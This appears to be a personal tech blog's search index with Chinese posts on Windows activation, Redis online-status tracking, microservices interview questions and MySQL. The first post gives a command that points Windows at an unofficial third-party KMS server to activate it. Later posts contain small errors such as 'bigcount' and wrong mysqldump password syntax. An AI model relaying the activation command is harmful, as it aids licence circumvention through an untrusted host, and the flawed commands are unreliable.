<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows激活</title>
      <link href="/2023/05/16/windows%E6%BF%80%E6%B4%BB/"/>
      <url>/2023/05/16/windows%E6%BF%80%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<p>用管理员权限打开DOS命令窗口，输入以下的命令即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slmgr /skms kms.v0v.bid &amp;&amp; slmgr /ato</span><br></pre></td></tr></table></figure><p>本人win10亲测有效，其他的版本暂时没试过</p>]]></content>
      
      
      <categories>
          
          <category> 杂类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电脑知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何处理亿级用户的登录状态查询</title>
      <link href="/2023/05/05/%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E4%BA%BF%E7%BA%A7%E7%94%A8%E6%88%B7%E7%9A%84%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81%E6%9F%A5%E8%AF%A2/"/>
      <url>/2023/05/05/%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E4%BA%BF%E7%BA%A7%E7%94%A8%E6%88%B7%E7%9A%84%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="假如系统需要统计一个上亿级别的的用户在线状态"><a href="#假如系统需要统计一个上亿级别的的用户在线状态" class="headerlink" title="假如系统需要统计一个上亿级别的的用户在线状态"></a>假如系统需要统计一个上亿级别的的用户在线状态</h2><h3 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h3><p>在数据库的基础上增加一个缓存，然后把登录状态存到redis里，在redis中去定义set类型的key，主要用来存储记录登录用户的ID。现在我们假设这个key叫login_user，如果用户登录，就往login_user中增加这个用户的id，如果用户登出就把这个key从set中删去，然后再用scard命令来统计set中的用户id的数量。</p><p>（但是这个方法对内存的消耗会有点大）</p><h3 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h3><p>使用redis的bitmap来存储数据，bitmap本身就是为了亿级数据而诞生的，可以使用他的几个命令，如setbit、getbit和bigcount，用户登录可以用setbit命令去设置一个key为login_status的内容，然后将用户id作为一个位移值，将这个值设为1，即状态为1，那么当用户登出的时候，我们可以使用setbit命令将其状态改为0，如果是判断某个用户是否在线，可以使用getbit命令，如果是统计登录用户数量，可以使用bigcount来进行统计</p><p>（此方法优点是快，去重查重效率高，缺点是bitmap的位移值只能是数字，用户id也只能是自增的纯数字id，不适合分布式架构）</p><h2 id="如果是实现热力地图"><a href="#如果是实现热力地图" class="headerlink" title="如果是实现热力地图"></a>如果是实现热力地图</h2><p>则可以使用redis的GEO，使用geoadd、geopos和geohash这些命令</p><p>当然，现在使用es的GEO更省事，如果加上ELK组合，则可以直接生成</p>]]></content>
      
      
      <categories>
          
          <category> java笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微服务面试题</title>
      <link href="/2023/04/06/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2023/04/06/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="1-什么是微服务？"><a href="#1-什么是微服务？" class="headerlink" title="1. 什么是微服务？"></a>1. 什么是微服务？</h3><p>微服务是一种架构风格，其中软件系统由一组小型服务构成，这些服务可以独立地部署、扩展和替换。每个服务都应该围绕着一个特定的业务能力进行构建，而且要能够独立地运行在自己的进程中。</p><h3 id="2-微服务的优点是什么？"><a href="#2-微服务的优点是什么？" class="headerlink" title="2.微服务的优点是什么？"></a>2.微服务的优点是什么？</h3><p>优点：</p><ul><li>更高的灵活性和可伸缩性。</li><li>更好的可维护性和可测试性。</li><li>更好的可扩展性和可部署性。</li><li>更好的分离关注点，每个服务都专注于自己的业务功能。</li></ul><p>缺点：</p><ul><li>更高的复杂性，需要额外的工具和基础设施来管理。</li><li>更高的开发和部署成本，需要对每个服务进行独立的开发、测试和部署。</li><li>更高的运维成本，需要对每个服务进行独立的监控、日志和故障排除。</li><li>更多的网络延迟和开销，由于服务之间的通信需要通过网络进行。</li></ul><h3 id="3-微服务常用组件"><a href="#3-微服务常用组件" class="headerlink" title="3.微服务常用组件"></a>3.微服务常用组件</h3><p>微服务架构通常会使用以下组件：</p><ol><li>服务注册与发现组件：例如Consul、ZooKeeper、Eureka等。它们用于将微服务实例注册到注册中心，并使客户端能够发现可用的服务实例。</li><li>API网关组件：例如Zuul、Kong、API Gateway for AWS等。它们用于将外部请求路由到相应的微服务，并提供负载均衡、安全性、缓存、限流等功能。</li><li>分布式配置中心组件：例如Spring Cloud Config、etcd等。它们用于将配置信息集中管理，并将其分发到不同的微服务实例中。</li><li>消息中间件组件：例如Kafka、RabbitMQ、ActiveMQ等。它们用于实现微服务之间的异步通信、事件驱动等。</li><li>监控与日志组件：例如ELK、Zipkin、Prometheus、Grafana等。它们用于收集、分析和展示微服务的运行时指标、日志信息等。</li><li>容器化平台组件：例如Docker、Kubernetes等。它们用于将微服务部署到容器中，并提供自动化部署、弹性伸缩、负载均衡等功能。</li><li>数据库和缓存组件：例如MySQL、Redis、MongoDB等。它们用于存储和管理微服务所需的数据和缓存信息</li></ol><h3 id="4-微服务架构和单体架构的区别是什么？"><a href="#4-微服务架构和单体架构的区别是什么？" class="headerlink" title="4.微服务架构和单体架构的区别是什么？"></a>4.微服务架构和单体架构的区别是什么？</h3><p>单体应用架构将整个应用程序构建为一个单一的、紧密耦合的系统，而微服务架构则将应用程序划分为一组较小的、独立的、松耦合的服务。单体应用程序通常更容易构建和部署，但是随着应用程序规模的增加，其复杂性也会增加。微服务架构则更加灵活和可伸缩，并且可以更好地支持大规模的分布式系统</p><h3 id="5-微服务架构中的服务发现和负载均衡有什么作用？"><a href="#5-微服务架构中的服务发现和负载均衡有什么作用？" class="headerlink" title="5.微服务架构中的服务发现和负载均衡有什么作用？"></a>5.微服务架构中的服务发现和负载均衡有什么作用？</h3><p>微服务架构中的服务发现和负载均衡有以下作用：</p><ol><li>服务发现：在微服务架构中，每个服务都是一个独立的部署单元，可能会动态地加入或退出系统，因此需要一个机制来自动发现服务的位置和状态。服务发现机制使得服务之间可以直接通信，不需要手动配置IP地址或端口号，同时也支持负载均衡和故障转移。</li><li>负载均衡：在微服务架构中，一个服务通常会有多个实例运行在不同的节点上，需要一个负载均衡器将请求分配到这些实例中，以达到负载均衡的效果。负载均衡器可以根据不同的策略来选择实例，如轮询、权重等。</li></ol><p>服务发现和负载均衡通常是通过一个服务注册中心来实现的，注册中心负责维护服务的信息和状态，同时提供API供服务之间进行注册、发现和心跳检测等操作。常见的服务注册中心有Consul、ZooKeeper和Etcd等。</p><h3 id="6-什么是服务注册与发现？"><a href="#6-什么是服务注册与发现？" class="headerlink" title="6.什么是服务注册与发现？"></a>6.什么是服务注册与发现？</h3><p>服务注册与发现是微服务架构中的一个核心概念，它允许服务在运行时注册自己的网络地址，并通过服务注册表使其可用于其他服务。服务注册表是一个包含所有可用服务及其地址的中央存储库，服务可以查询此存储库以查找需要的其他服务。</p><h3 id="7-如何处理微服务中的异步调用？"><a href="#7-如何处理微服务中的异步调用？" class="headerlink" title="7.如何处理微服务中的异步调用？"></a>7.如何处理微服务中的异步调用？</h3><p>在微服务架构中，异步调用是一个常见的技术，可以提高系统的可扩展性和性能。下面是处理微服务中异步调用的几种常见方式：</p><ol><li>消息队列：使用消息队列可以实现异步调用，例如将需要执行的任务放入消息队列中，然后由消息队列中的消费者异步处理。</li><li>异步REST：使用异步REST的方式，客户端通过发起异步HTTP请求来调用服务端的API。服务端接收请求后，返回HTTP响应，并不等待客户端处理响应。</li><li>Reactive编程：使用Reactive编程模型，可以在异步调用中处理大量并发请求，以提高系统的性能和吞吐量。</li><li>Future/Promise：使用Java中的Future/Promise来处理异步调用。当客户端调用服务端API时，服务端可以立即返回一个Future对象，客户端可以在需要时获取Future的结果。</li><li>Callback回调：使用Callback回调机制，当服务端处理完请求后，可以通过回调机制来通知客户端，从而实现异步调用。</li></ol><p>以上这些方式都可以用来处理微服务中的异步调用，具体应该根据实际情况选择合适的方式。</p><h3 id="8-微服务如何保证数据的一致性？"><a href="#8-微服务如何保证数据的一致性？" class="headerlink" title="8.微服务如何保证数据的一致性？"></a>8.微服务如何保证数据的一致性？</h3><p>微服务架构下，由于每个服务都有自己的数据库，因此保证数据的一致性变得更加困难。以下是一些常见的方法来解决微服务中的数据一致性问题：</p><ol><li>两阶段提交协议：在分布式系统中，最为经典的解决数据一致性问题的方法就是两阶段提交协议。该协议分为两个阶段，第一个阶段是准备阶段，在该阶段中，协调者向所有参与者发出准备请求，参与者执行本地事务，并反馈事务执行结果给协调者。如果所有参与者都执行成功，那么协调者就会向所有参与者发出提交请求，所有参与者在收到提交请求后执行提交操作，如果有任何一个参与者在准备阶段或提交阶段失败，那么整个操作将被回滚，保证数据一致性。</li><li>三阶段提交协议：该协议是在两阶段提交协议的基础上演化而来，它在两阶段提交协议的基础上增加了一个超时机制，从而解决了两阶段提交协议中的阻塞问题。</li><li>消息队列：在微服务架构中，可以通过消息队列来解决数据一致性问题。当需要多个服务协作完成一项操作时，将操作请求发送到消息队列中，每个服务从队列中获取请求并执行相应的操作，完成后再将结果发送到消息队列中，其他服务再从队列中获取结果进行后续处理。</li><li>分布式事务：使用分布式事务来处理数据一致性问题是一种比较彻底的解决方案，但实现起来比较复杂。在分布式事务中，所有涉及到的服务都参与到同一个全局事务中，由一个事务协调者来管理整个事务的执行过程，保证所有操作的一致性。</li></ol><h3 id="9-什么是api网关？有什么作用？"><a href="#9-什么是api网关？有什么作用？" class="headerlink" title="9.什么是api网关？有什么作用？"></a>9.什么是api网关？有什么作用？</h3><p>API网关是一个微服务架构中的组件，用于统一对外暴露的API接口，并提供一些常见的API网关功能，例如路由、负载均衡、缓存、鉴权和监控等。API网关通常是一个单独的、可扩展的组件，可以轻松地集成到现有的微服务架构中</p><h3 id="10-微服务中怎么保证分布式事务的一致性？"><a href="#10-微服务中怎么保证分布式事务的一致性？" class="headerlink" title="10.微服务中怎么保证分布式事务的一致性？"></a>10.微服务中怎么保证分布式事务的一致性？</h3><p>在微服务架构中，由于每个服务都是独立的进程，因此可能会出现分布式事务一致性的问题。为了保证分布式事务的一致性，可以采用以下方法：</p><ol><li>两阶段提交（2PC）：在2PC中，事务的提交被分为两个阶段：投票和提交。在投票阶段，所有涉及到的事务参与者将通知协调者是否可以提交。如果所有参与者都同意提交，则进入提交阶段，所有参与者将提交事务，并等待协调者发送提交完成消息。如果有任何一个参与者拒绝提交，则事务将被回滚。</li><li>补偿事务（Compensating Transaction）：在补偿事务中，当分布式事务中的一个或多个服务发生错误时，可以回滚已经执行的操作，同时执行与之相反的操作以保证数据一致性。例如，如果在购买商品的过程中发生错误，可以执行取消订单的操作以回滚已经扣除的金额。</li><li>基于消息的事务（Message-based Transaction）：在基于消息的事务中，将事务提交操作和后续处理操作分离开来，通过消息队列来实现两者的解耦。当事务提交时，将消息发送到消息队列中，其他服务订阅该消息并执行后续处理操作。如果后续处理操作失败，则可以回滚之前的事务提交操作。</li><li>Saga模式：Saga模式是一种用于解决分布式事务问题的设计模式。在Saga模式中，事务被拆分成多个子事务，每个子事务都有自己的回滚操作。当一个子事务失败时，将会执行回滚操作，以保证数据一致性。Saga模式需要对业务流程进行拆分和设计，并且需要在每个服务中实现Saga协议</li></ol><h3 id="微服务架构中服务之间的通信方式有哪些？它们的优缺点是什么？如何选择适合自己业务的通信方式？"><a href="#微服务架构中服务之间的通信方式有哪些？它们的优缺点是什么？如何选择适合自己业务的通信方式？" class="headerlink" title="微服务架构中服务之间的通信方式有哪些？它们的优缺点是什么？如何选择适合自己业务的通信方式？"></a>微服务架构中服务之间的通信方式有哪些？它们的优缺点是什么？如何选择适合自己业务的通信方式？</h3><p>微服务架构中服务之间的通信方式主要包括以下几种：</p><ol><li>HTTP/REST：使用 HTTP 协议进行通信，以 RESTful 风格设计 API。优点是简单易用，易于理解和调试，支持各种编程语言，适合互联网应用等场景。缺点是性能相对较低，不适合大规模高并发的场景。</li><li>RPC：远程过程调用，通过定义接口和协议进行通信。优点是性能较高，支持异步和多种协议，适合复杂业务场景。缺点是实现和维护成本较高，不利于跨语言和跨平台调用。</li><li>消息队列：通过消息中间件进行通信，发送和接收消息。优点是支持异步和削峰填谷，可靠性高，支持广播和多消费者模式，适合分布式和异构系统。缺点是实现和维护成本较高，不支持实时性要求高的场景。</li><li>gRPC：Google 开源的基于 HTTP/2 和 Protobuf 的高性能 RPC 框架。优点是性能和功能优秀，支持多语言和多平台，适合复杂业务场景。缺点是使用复杂度较高，需要熟练掌握 Protobuf 和 HTTP/2。</li></ol><p>选择适合自己业务的通信方式需要考虑多个方面，如性能要求、并发量、数据一致性、服务可靠性、开发成本、跨平台和跨语言等因素。需要根据实际情况进行综合评估和选择。</p><h3 id="如何保证微服务架构下的服务高可用？有哪些常用的方法？"><a href="#如何保证微服务架构下的服务高可用？有哪些常用的方法？" class="headerlink" title="如何保证微服务架构下的服务高可用？有哪些常用的方法？"></a>如何保证微服务架构下的服务高可用？有哪些常用的方法？</h3><p>微服务架构下的服务高可用是保障整个系统稳定性和可靠性的关键因素之一。为了保证微服务架构下的服务高可用，可以采用以下常用方法：</p><ol><li>负载均衡：通过负载均衡技术将请求分发到多个服务实例中，实现服务的水平扩展，提高系统吞吐量和可用性。</li><li>集群：将多个服务实例部署到不同的节点上，通过集群技术实现服务的纵向扩展，提高系统的容错性和可用性。</li><li>服务治理：通过服务注册和发现、服务监控、服务熔断等手段实现服务的高可用和自动化管理。</li><li>异地多活：将服务实例部署到不同的地理位置上，通过异地多活技术实现灾备容灾和故障恢复，提高系统的可用性和稳定性。</li><li>自动化运维：通过自动化部署、自动化测试、自动化监控等手段实现服务的快速上线、自动化管理和快速响应故障，提高系统的可用性和稳定性。</li></ol><p>需要根据具体的业务场景和系统要求，结合实际情况进行综合考虑和选择。同时，也需要注重服务的监控和容错机制，及时发现和处理故障，保障服务的高可用性和可靠性。</p><h3 id="如何实现微服务架构下的服务治理？常用的服务注册中心有哪些？它们的特点和适用场景是什么？"><a href="#如何实现微服务架构下的服务治理？常用的服务注册中心有哪些？它们的特点和适用场景是什么？" class="headerlink" title="如何实现微服务架构下的服务治理？常用的服务注册中心有哪些？它们的特点和适用场景是什么？"></a>如何实现微服务架构下的服务治理？常用的服务注册中心有哪些？它们的特点和适用场景是什么？</h3><p>微服务架构下的服务治理包括服务注册和发现、服务路由和负载均衡、服务监控和熔断等，通过这些手段实现服务的高可用和自动化管理。其中，服务注册和发现是服务治理的核心，常用的服务注册中心有以下几种：</p><ol><li>Eureka：Netflix 开源的服务注册中心，支持高可用、自动化管理和弹性伸缩等特性，适用于 Spring Cloud 微服务架构。</li><li>Consul：由 HashiCorp 开发的服务注册中心，支持多数据中心、健康检查、DNS 和 HTTP API 等特性，适用于各种语言和微服务架构。</li><li>ZooKeeper：Apache 开源的分布式协调服务，支持分布式锁、配置管理、命名服务等特性，适用于大规模分布式系统和 Hadoop 生态系统。</li><li>Nacos：阿里巴巴开源的服务注册中心，支持多协议注册、动态配置、服务路由和 DNS 解析等特性，适用于各种语言和微服务架构。</li></ol><p>这些服务注册中心都具有高可用、服务发现、健康检查、负载均衡和自动化管理等特性，具体适用场景和特点可以根据实际情况进行选择。同时，需要注重服务的监控和容错机制，及时发现和处理故障，保障服务的高可用性和可靠性。</p><h3 id="11-linux常用命令"><a href="#11-linux常用命令" class="headerlink" title="11.linux常用命令"></a>11.linux常用命令</h3><ol><li>cd：改变当前目录。</li><li>ls：列出当前目录中的文件和目录。</li><li>pwd：显示当前工作目录的路径。</li><li>mkdir：创建一个新目录。</li><li>touch：创建一个空文件或者更新一个已有的文件的时间戳。</li><li>cat：连接文件并打印到标准输出设备上。</li><li>cp：将文件或目录复制到另一个文件或目录中。</li><li>mv：将文件或目录移动到另一个位置。</li><li>rm：删除文件或目录。</li><li>chmod：更改文件或目录的权限。</li><li>chown：更改文件或目录的所有者。</li><li>ps：显示系统中正在运行的进程。</li><li>top：显示系统中正在运行的进程和系统资源的使用情况。</li><li>grep：在文件中搜索指定的模式。</li><li>find：在文件系统中查找文件。</li><li>tar：将文件打包成一个归档文件。</li><li>gzip：压缩文件。</li><li>unzip：解压缩文件</li></ol><h3 id="12-优化数据库的方案"><a href="#12-优化数据库的方案" class="headerlink" title="12.优化数据库的方案"></a>12.优化数据库的方案</h3><p>优化数据库可以从多个方面入手，以下是一些优化数据库的方案：</p><ol><li>硬件优化：升级服务器的CPU、内存和硬盘等硬件设备，提高整体性能和响应速度。</li><li>数据库设计优化：优化数据表设计，合理设计字段、索引和约束等。</li><li>SQL 语句优化：使用优化的 SQL 语句，例如减少使用子查询、使用正确的关键字等。</li><li>索引优化：合理设计索引，根据查询需求选择适当的索引类型。</li><li>缓存优化：使用缓存技术，例如将频繁查询的数据存储在缓存中，减少对数据库的访问次数。</li><li>分区表优化：将大型表按照业务逻辑和数据特性进行分区，提高查询性能。</li><li>服务器参数优化：根据数据库特性和负载情况，合理设置服务器参数，例如内存缓冲池大小、线程池大小等。</li><li>数据库连接池优化：使用数据库连接池，管理数据库连接的创建和销毁，提高连接的复用率。</li><li>数据库备份和恢复优化：选择合适的备份和恢复策略，保证数据的完整性和可恢复性。</li></ol><p>以上是一些优化数据库的方案，根据具体情况进行选择和实施。</p><h3 id="11-mysql索引失效的原因和解决方法"><a href="#11-mysql索引失效的原因和解决方法" class="headerlink" title="11.mysql索引失效的原因和解决方法"></a>11.mysql索引失效的原因和解决方法</h3><p>MySQL索引失效可能由多种原因导致，以下是一些常见原因和相应的解决方法：</p><ol><li>索引列上使用了函数：当在索引列上使用函数时，MySQL不能使用索引来加速查询，因为索引的值已经被函数处理过。解决方法是尽可能避免在索引列上使用函数，或者使用函数索引。</li><li>数据库中数据分布不均：当索引列的数据分布不均匀时，查询时可能会导致索引失效。解决方法是优化查询语句，使用更精确的查询条件，或者重新设计索引。</li><li>查询条件中包含不等于(!=)或不匹配(&lt;&gt;)操作符：不等于或不匹配操作符在索引列上的查询可能会导致索引失效。解决方法是尽可能避免在索引列上使用不等于或不匹配操作符。</li><li>使用LIKE操作符模糊查询：当使用LIKE操作符模糊查询时，MySQL可能无法使用索引来加速查询，因为LIKE操作符在索引列上需要进行模式匹配。解决方法是尽可能避免使用LIKE操作符，或者使用全文索引。</li><li>查询语句中使用了OR操作符：当查询语句中使用OR操作符时，MySQL可能无法使用索引来加速查询。解决方法是尽可能使用AND操作符，或者使用UNION操作符将多个查询合并为一个查询。</li><li>数据表使用了不合适的存储引擎：不同的存储引擎对索引的使用方式有所不同。如果数据表使用了不合适的存储引擎，可能会导致索引失效。解决方法是选择合适的存储引擎，如InnoDB。</li><li>数据表过度规范化：过度规范化可能会导致多表联接查询，从而导致索引失效。解决方法是重新设计数据表结构，尽可能避免多表联接查询。</li><li>查询缓存：当查询缓存生效时，MySQL可能无法使用索引来加速查询。解决方法是禁用查询缓存，或者使用更精确的查询条件。</li></ol><h3 id="—————————————————————————————————————————————————Mysql—————————————————————————————————————————————————"><a href="#—————————————————————————————————————————————————Mysql—————————————————————————————————————————————————" class="headerlink" title="—————————————————————————————————————————————————Mysql—————————————————————————————————————————————————"></a>—————————————————————————————————————————————————Mysql—————————————————————————————————————————————————</h3><h3 id="什么是-MySQL？它有哪些特点？"><a href="#什么是-MySQL？它有哪些特点？" class="headerlink" title="什么是 MySQL？它有哪些特点？"></a>什么是 MySQL？它有哪些特点？</h3><p>MySQL是一种开源的关系型数据库管理系统（RDBMS），它支持多用户、多线程，可用于各种规模的应用程序。以下是MySQL的主要特点：</p><ol><li>可靠性：MySQL非常可靠，能够在故障时自动恢复，也支持数据备份和恢复。</li><li>高性能：MySQL支持高并发和高负载，能够处理大量数据。</li><li>灵活性：MySQL支持多种存储引擎，可以根据应用程序的需求选择最合适的引擎。</li><li>安全性：MySQL提供了多层安全保护，包括用户权限管理、SSL加密、防火墙和入侵检测等。</li><li>开放性：MySQL是开源软件，用户可以自由使用、修改和分发，也可以参与社区的开发和维护。</li><li>易用性：MySQL具有友好的命令行工具和图形界面管理工具，方便用户进行数据库管理和维护。</li></ol><p>总之，MySQL是一个强大、可靠、高效、灵活、安全、开放和易用的关系型数据库管理系统，已经成为世界上最受欢迎的开源数据库之一。</p><h3 id="MySQL-中有哪些数据类型？它们分别用于什么场景？"><a href="#MySQL-中有哪些数据类型？它们分别用于什么场景？" class="headerlink" title="MySQL 中有哪些数据类型？它们分别用于什么场景？"></a>MySQL 中有哪些数据类型？它们分别用于什么场景？</h3><p>MySQL支持多种数据类型，包括以下几种：</p><ol><li>整型（Integer Types）：用于存储整数，包括TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT等。不同类型的整型可以存储不同范围的整数值。</li><li>浮点数（Floating-Point Types）：用于存储浮点数，包括FLOAT和DOUBLE。FLOAT和DOUBLE分别占4个字节和8个字节，存储的范围和精度不同。</li><li>定点数（Fixed-Point Types）：用于存储带有小数位数的数字，包括DECIMAL和NUMERIC。DECIMAL和NUMERIC可以指定精度和小数位数，适用于对精度要求比较高的场景。</li><li>字符串（String Types）：用于存储字符串，包括CHAR、VARCHAR、TEXT、BLOB等。CHAR和VARCHAR是固定长度和可变长度的字符串类型，TEXT和BLOB用于存储大文本和二进制数据。</li><li>日期和时间（Date and Time Types）：用于存储日期和时间信息，包括DATE、TIME、DATETIME和TIMESTAMP等。</li><li>枚举（Enumeration Types）：用于存储枚举类型，可以选择枚举中的一个值作为字段值。</li><li>集合（Set Types）：用于存储一组值，可以从集合中选择多个值作为字段值。</li></ol><p>不同的数据类型适用于不同的场景，例如整型适用于存储数字，字符串适用于存储文本信息，日期和时间类型适用于存储日期和时间信息等。在选择数据类型时，需要考虑存储的数据范围、精度和存储空间等因素。</p><h3 id="MySQL-中如何进行事务管理？"><a href="#MySQL-中如何进行事务管理？" class="headerlink" title="MySQL 中如何进行事务管理？"></a>MySQL 中如何进行事务管理？</h3><p>在 MySQL 中，事务是一组数据库操作，它们被视为单个逻辑单元并且要么全部执行成功，要么全部回滚。MySQL 提供了以下两种事务管理方式：</p><ol><li><p>基于 SQL 语句的事务管理：</p><p>在 MySQL 中，使用 BEGIN 或 START TRANSACTION 命令来标记事务的开始。在事务内，所有的 INSERT、UPDATE 和 DELETE 操作都是针对事务执行的，而不是针对单个的数据行执行。最后，使用 COMMIT 或 ROLLBACK 命令来结束事务，根据执行结果决定是提交还是回滚所有的操作。</p></li><li><p>基于应用程序的事务管理：</p><p>应用程序级别的事务管理通常是通过编写代码来实现的。在这种情况下，开发人员需要在代码中显式地开启事务，执行相关操作，然后根据操作的成功与否来决定是提交还是回滚事务。</p></li></ol><p>无论是基于 SQL 语句还是基于应用程序的事务管理，都需要遵守事务的四个基本特性：原子性、一致性、隔离性和持久性。其中，原子性指整个事务中的所有操作要么全部执行成功，要么全部失败；一致性指事务结束时数据库必须保持一致状态；隔离性指在事务执行过程中，它所做的修改对其他事务是不可见的；持久性指事务结束后，其所做的修改会被永久保存在数据库中，即使出现故障也不会丢失。</p><h3 id="如何优化-MySQL-查询性能？"><a href="#如何优化-MySQL-查询性能？" class="headerlink" title="如何优化 MySQL 查询性能？"></a>如何优化 MySQL 查询性能？</h3><p>优化 MySQL 查询性能是数据库管理中一个重要的方面。以下是一些可能提高 MySQL 查询性能的建议：</p><ol><li>确保表有正确的索引：在查询时使用索引可以大大提高查询速度。索引应该根据数据使用情况来选择。可以使用 EXPLAIN 命令来分析查询计划，以帮助确定索引使用是否正确。</li><li>使用合适的查询：查询可以使用不同的语句，例如 SELECT、JOIN、UNION 和子查询。查询的复杂性越高，性能就越低。因此，应该选择最简单和最有效的查询语句来完成任务。</li><li>使用缓存：MySQL 有一个查询缓存，它可以缓存查询结果。如果查询相同的数据，则可以从缓存中读取结果，而不必重新执行查询。</li><li>避免使用通配符：查询中的通配符（如“%”和“_”）会导致查询效率降低，因为它们需要执行全表扫描。</li><li>分页查询时，使用 LIMIT：如果查询返回大量数据，则使用 LIMIT 来限制返回的数据量。</li><li>优化表结构：表结构的优化可以包括选择正确的数据类型、避免使用 NULL 值、规范化表结构等。这可以提高查询的性能并减少存储空间。</li><li>垂直分区：对于大型表，可以将表垂直分区为两个或多个表，以提高查询性能。</li><li>使用连接池：连接池可以减少创建和关闭连接的开销，并使连接可以重复使用，从而提高查询性能。</li></ol><p>这些是一些常见的 MySQL 查询性能优化建议。但是，对于具体的应用场景，还需要根据具体情况进行优化。</p><h3 id="如何使用索引提高查询性能？"><a href="#如何使用索引提高查询性能？" class="headerlink" title="如何使用索引提高查询性能？"></a>如何使用索引提高查询性能？</h3><p>使用索引可以大大提高MySQL的查询性能，以下是使用索引提高查询性能的几个方法：</p><ol><li>选择合适的数据类型：使用更小的数据类型来保存数据可以降低索引的大小，从而提高查询性能。</li><li>选择合适的索引类型：MySQL支持多种类型的索引，包括B-tree索引、哈希索引和全文索引等。根据实际情况选择适合的索引类型可以提高查询性能。</li><li>创建复合索引：当查询条件涉及多个列时，可以使用复合索引，它可以将多个列合并成一个索引，提高查询性能。</li><li>避免使用SELECT <em>：在查询时尽量避免使用SELECT </em>，因为这会导致查询不必要的数据，从而降低查询性能。</li><li>避免在WHERE子句中使用函数：在WHERE子句中使用函数会导致MySQL无法使用索引，从而降低查询性能。</li><li>对查询进行优化：使用EXPLAIN语句可以分析查询语句的执行计划，从而优化查询语句，提高查询性能。</li><li>定期分析表：通过定期分析表可以更新表的统计信息，从而优化查询执行计划，提高查询性能。</li></ol><p>总的来说，使用索引是提高MySQL查询性能的重要手段，但是在使用索引时也需要根据实际情况进行合理选择和使用，避免索引带来的不必要开销。</p><h3 id="MySQL-中的隔离级别是什么？各个隔离级别有什么不同？"><a href="#MySQL-中的隔离级别是什么？各个隔离级别有什么不同？" class="headerlink" title="MySQL 中的隔离级别是什么？各个隔离级别有什么不同？"></a>MySQL 中的隔离级别是什么？各个隔离级别有什么不同？</h3><p>MySQL中的隔离级别指的是多个事务同时操作同一个数据时的隔离程度，包括读未提交、读提交、可重复读和串行化四个级别。各个隔离级别的不同点如下：</p><ol><li>读未提交（Read Uncommitted）：最低的隔离级别，事务之间完全没有隔离，一个事务可以读取另一个事务未提交的数据。这种隔离级别很容易导致脏读、不可重复读和幻读的问题。</li><li>读提交（Read Committed）：事务只能读取已经提交的数据，可以避免脏读的问题。但是在同一个事务中，多次读取同一数据可能会出现不同的结果，称为不可重复读。</li><li>可重复读（Repeatable Read）：在同一个事务中，多次读取同一数据都会得到相同的结果，避免了不可重复读的问题。但是在这种隔离级别下，可能会出现幻读的问题，即一个事务读取了其他事务已提交的数据，但是在该事务提交前，另外的事务插入了新数据，导致该事务再次读取时出现新数据。</li><li>串行化（Serializable）：最高的隔离级别，完全避免了并发问题，事务串行执行，可以避免所有的并发问题。但是这种隔离级别下，效率非常低，通常不会采用。</li></ol><p>一般情况下，可重复读是MySQL的默认隔离级别，适用于大多数场景。但是对于高并发的系统，为了避免幻读的问题，可能需要将隔离级别调整为读提交或者使用更加高级的机制来避免并发问题。</p><h3 id="MySQL-中如何进行备份和恢复？"><a href="#MySQL-中如何进行备份和恢复？" class="headerlink" title="MySQL 中如何进行备份和恢复？"></a>MySQL 中如何进行备份和恢复？</h3><p>MySQL 数据库备份和恢复是数据库管理中的重要任务之一，以下是一些备份和恢复 MySQL 数据库的方法：</p><ol><li>备份：可以使用 mysqldump 命令来备份 MySQL 数据库。这个命令可以生成一个 SQL 脚本文件，其中包含了数据库的结构和数据。命令语法如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cssCopy code</span><br><span class="line">mysqldump -u [用户名] -p [密码] [数据库名] &gt; [备份文件名].sql</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>恢复：可以使用 MySQL 自带的命令行工具 mysql 来执行备份文件来进行数据恢复。命令语法如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cssCopy code</span><br><span class="line">mysql -u [用户名] -p [密码] [数据库名] &lt; [备份文件名].sql</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>使用物理备份：物理备份是将 MySQL 数据库文件复制到另一个位置的过程。可以使用文件系统备份工具进行备份，如 tar 或 rsync。恢复时，将备份文件复制到原始位置即可。</li><li>使用第三方备份工具：有一些第三方备份工具可以用于备份 MySQL 数据库，如 Percona XtraBackup 或 MySQL Enterprise Backup。</li></ol><p>在备份和恢复 MySQL 数据库时，需要注意以下几点：</p><ul><li>备份频率：需要根据业务需求和数据库变更频率定期备份数据库。</li><li>备份文件存储位置：需要将备份文件存储在可靠的位置，以防止丢失或损坏。</li><li>恢复测试：需要定期测试备份文件是否能够成功地恢复到数据库。</li><li>定期清理备份文件：需要定期清理过期的备份文件以释放存储空间。</li></ul><p>总之，备份和恢复 MySQL 数据库是一项重要的任务，需要认真考虑备份策略，并定期测试备份文件的恢复过程。</p><h3 id="MySQL-中如何进行主从复制？"><a href="#MySQL-中如何进行主从复制？" class="headerlink" title="MySQL 中如何进行主从复制？"></a>MySQL 